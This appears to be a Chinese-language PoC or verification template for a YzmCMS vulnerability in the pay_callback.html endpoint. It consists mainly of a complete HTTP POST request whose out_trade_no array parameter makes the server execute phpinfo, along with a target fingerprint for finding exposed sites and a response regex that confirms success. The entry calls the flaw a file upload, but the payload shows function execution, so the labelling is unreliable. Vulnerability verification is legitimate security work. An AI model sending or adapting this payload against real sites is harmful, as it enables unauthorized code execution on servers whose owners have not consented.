﻿# YzmCMS 内容管理系统 pay_callback.html 文件上传漏洞

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：YzmCMS是一款基于YZMPHP开发的一套轻量级开源内容管理系统，YzmCMS简洁、安全、开源、免费，可运行在Linux、Windows、MacOSX、Solaris等各种平台上，专注为公司企业、个人站长快速建站提供解决方案。YzmCMS内容管理系统pay_callback.html接口存在任意文件上传漏洞

> 漏洞特征：app="yzmcms"

> 验证脚本：HTTP

```
POST /pay/index/pay_callback.html HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded

out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?PHP)(?=.*?Version).*?$

> 上传文件定位：

> 验证文件来源：YzmCMS 内容管理系统 pay_callback.html 文件上传漏洞.poc

